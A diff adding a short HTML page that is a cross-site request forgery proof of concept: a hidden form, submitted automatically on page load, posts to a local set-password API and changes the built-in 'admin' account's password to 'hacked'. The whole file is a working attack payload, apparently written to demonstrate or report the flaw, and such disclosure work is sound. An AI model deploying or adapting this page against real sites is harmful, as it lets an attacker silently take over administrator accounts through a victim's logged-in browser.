@@ -1,0 +1,11 @@
+<html>
+<form action="http://localhost:8000/api/set-password" method="POST">
+    <input name='userOwner' value='built&#45;in' type='hidden'>
+    <input name='userName' value='admin' type='hidden'>
+    <input name='newPassword' value='hacked' type='hidden'>
+    <input type=submit>
+</form>
+<script>
+    history.pushState('', '', '/');
+    document.forms[0].submit();
+</script>
